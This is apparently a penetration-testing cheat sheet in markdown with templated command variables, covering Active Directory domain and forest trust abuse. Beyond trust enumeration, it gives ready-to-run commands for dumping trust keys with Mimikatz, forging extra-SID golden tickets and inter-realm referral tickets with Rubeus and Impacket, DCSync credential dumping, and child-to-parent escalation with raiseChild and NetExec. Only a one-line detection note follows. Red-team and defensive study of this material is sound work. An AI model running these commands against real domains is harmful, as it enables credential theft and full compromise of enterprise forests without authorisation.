---
technique: Domain Trusts
category: trusts
targets: Domain, Forest, Trust Relationship
protocols: LDAP, Kerberos, MSRPC
remote_capable: true
tags: ad trusts forest sid-history inter-realm kerberos powerview impacket
---

# Domain Trusts

Domain and forest trusts define where identities from one domain can authenticate to resources in another. Trust abuse starts with mapping trust direction, foreign principals, SID filtering behavior, and available cross-domain permissions.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Enumeration | Any domain user can usually enumerate direct trusts |
| Cross-domain abuse | Forgery paths require krbtgt, trust account, or inter-realm key material |
| SID filtering | Extra SID abuse depends on filtering behavior across the trust |

## Windows

### PowerView: list domain trusts

#powershell #powerview #trusts

List trust relationships for the current domain.

```powershell title:"List domain trusts with PowerView"
Get-DomainTrust
```
<!-- cheat -->

### PowerView: list forest trusts

#powershell #powerview #trusts

List forest-level trusts.

```powershell title:"List forest trusts with PowerView"
Get-ForestTrust
```
<!-- cheat -->

### PowerView: map trusts

#powershell #powerview #trusts

Recursively map trusts reachable from the current domain.

```powershell title:"Map reachable domain trusts"
Get-DomainTrustMapping
```
<!-- cheat -->

### PowerView: query global catalog trusts

#powershell #powerview #global-catalog

Enumerate trust objects through the global catalog.

```powershell title:"Query trusts through global catalog"
Get-DomainTrust -SearchBase "GC://$env:USERDNSDOMAIN"
```
<!-- cheat -->

### PowerView: find foreign users

#powershell #powerview #foreign-principal

Find users from other domains that have group membership in the current domain.

```powershell title:"Find foreign users in local groups"
Get-DomainForeignUser
```
<!-- cheat -->

### PowerView: find foreign group members

#powershell #powerview #foreign-principal

Find groups in this domain that contain members from another domain.

```powershell title:"Find groups with foreign members"
Get-DomainForeignGroupMember
```
<!-- cheat -->

### PowerView: read trust keys

#powershell #powerview #trust-key

Read trust account keys when the current context can access them.

```powershell title:"Read trust account keys"
Get-DomainTrustKey
```
<!-- cheat -->

### AD module: list trusts

#powershell #rsat #trusts

List trust relationships with the Active Directory module.

```powershell title:"List trusts with Get-ADTrust"
Get-ADTrust -Filter *
```
<!-- cheat -->

### netdom: query trust

#cmd #netdom #trusts

Query trust details for a target domain.

```cmd title:"Query trust with netdom"
netdom trust /domain:$target_domain
```
<!-- cheat
var target_domain
-->

### Rubeus: forge extra SID TGT

#powershell #rubeus #golden-ticket #sid-history

Forge and inject a TGT with extra SIDs for cross-domain access.

```powershell title:"Forge TGT with extra SIDs"
.\Rubeus.exe golden /rc4:$krbtgt_hash /domain:$domain /sid:$domain_sid /sids:$extra_sids /user:$user /ptt
```
<!-- cheat
var krbtgt_hash
var domain
var domain_sid
var extra_sids
var user
-->

### Mimikatz: forge child to parent ticket

#cmd #mimikatz #golden-ticket #sid-history

Forge and inject a child-domain TGT with the parent Enterprise Admins SID.

```cmd title:"Forge child-to-parent ticket with Enterprise Admins SID"
.\mimikatz.exe "kerberos::golden /user:$user /domain:$child_domain /sid:$child_sid /krbtgt:$krbtgt_hash /sids:$parent_sid-519 /ptt" exit
```
<!-- cheat
var user
var child_domain
var child_sid
var krbtgt_hash
var parent_sid
-->

### Mimikatz: dump trust secrets

#cmd #mimikatz #trust-key

Dump trust secrets from a compromised domain controller.

```cmd title:"Dump trust secrets with Mimikatz"
.\mimikatz.exe "lsadump::trust /patch" exit
```
<!-- cheat -->

## Linux

### ldeep: enumerate trusts

#ldeep #ldap #trusts

Enumerate trusts over LDAP with ldeep.

```sh title:"Enumerate trusts with ldeep"
ldeep ldap -u "$user" -p "$pass" -d "$domain" -s ldap://"$rhost_ip" trusts
```
<!-- cheat
import domain_ip
import users
import passwords
-->

### ldapdomaindump: dump trust data

#ldapdomaindump #ldap #trusts

Dump LDAP domain data that includes trust objects.

```sh title:"Dump LDAP domain data with ldapdomaindump"
ldapdomaindump --user "$domain\\$user" --password "$pass" --outdir "$out_dir" "$rhost_name"
```
<!-- cheat
import domain_ip
import users
import passwords
var rhost_name
var out_dir
-->

### ldapsearch-ad: enumerate trusts

#ldapsearch-ad #ldap #trusts

Enumerate trusts with ldapsearch-ad.

```sh title:"Enumerate trusts with ldapsearch-ad"
ldapsearch-ad --server "$rhost_name" --domain "$domain" --username "$user" --password "$pass" --type trusts
```
<!-- cheat
import domain_ip
import users
import passwords
var rhost_name
-->

### ldapsearch: query trustedDomain objects

#ldapsearch #ldap #trusts

Query trustedDomain objects directly.

```sh title:"Query trustedDomain objects with ldapsearch"
ldapsearch -H ldap://"$rhost_ip" -D "$user@$domain" -w "$pass" -b "CN=System,$base_dn" "(objectClass=trustedDomain)"
```
<!-- cheat
import domain_ip
import users
import passwords
var base_dn
-->

### Impacket: resolve domain SID

#impacket #sid #trusts

Resolve the domain SID before forging tickets with extra SIDs.

```sh title:"Resolve domain SID with lookupsid"
lookupsid.py "$domain/$user:$pass@$rhost_ip"
```
<!-- cheat
import domain_ip
import users
import passwords
-->

### Impacket: forge referral ticket

#impacket #ticketer #inter-realm

Forge an inter-realm referral ticket with a target-domain extra SID.

```sh title:"Forge inter-realm referral ticket"
ticketer.py -nthash "$trust_hash" -domain-sid "$source_domain_sid" -domain "$source_domain" -extra-sid "$target_domain_sid-$target_rid" -spn "krbtgt/$target_domain" "$ticket_user"
```
<!-- cheat
var trust_hash
var source_domain_sid
var source_domain
var target_domain_sid
var target_rid
var target_domain
var ticket_user
-->

### Impacket: request service ticket from referral

#impacket #getst #inter-realm

Use a forged referral ticket to request a service ticket in the target domain.

```sh title:"Request service ticket with forged referral"
KRB5CCNAME="$ticket_user.ccache" getST.py -k -no-pass -spn "$service_spn/$rhost_fqdn" "$target_domain/$ticket_user@$target_domain"
```
<!-- cheat
var ticket_user
var service_spn
var rhost_fqdn
var target_domain
-->

### Impacket: forge extra SID golden ticket

#impacket #ticketer #golden-ticket #sid-history

Forge a golden ticket with an extra SID for child-to-parent or partially filtered trust abuse.

```sh title:"Forge golden ticket with extra SID"
ticketer.py -nthash "$krbtgt_hash" -domain "$domain" -domain-sid "$domain_sid" -extra-sid "$extra_sid" "$ticket_user"
```
<!-- cheat
var krbtgt_hash
var domain
var domain_sid
var extra_sid
var ticket_user
-->

### Impacket: use forged ticket for DCSync

#impacket #secretsdump #dcsync #kerberos

Use a forged Kerberos ticket to DCSync the target domain.

```sh title:"DCSync target domain with forged ticket"
KRB5CCNAME="$ticket_user.ccache" secretsdump.py -k -no-pass "$target_domain/$ticket_user@$dc_fqdn"
```
<!-- cheat
var ticket_user
var target_domain
var dc_fqdn
-->

### Impacket: raise child domain

#impacket #raisechild #trusts

Automate child-to-parent escalation when SID filtering permits Enterprise Admins extra SID abuse.

```sh title:"Raise child domain to parent with Impacket"
raiseChild.py "$domain/$user:$pass"
```
<!-- cheat
import domain_ip
import users
import passwords
-->

### NetExec: raise child domain

#netexec #raisechild #trusts

Run the NetExec raisechild module against a child domain.

```sh title:"Raise child domain to parent with NetExec"
nxc ldap "$domain" -u "$user" $auth_flags -M raisechild
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

## Detection

Monitor trust object reads from unusual hosts, trust key access, golden ticket indicators with extra SIDs, and service ticket requests that cross trusts with unexpected authorization data.
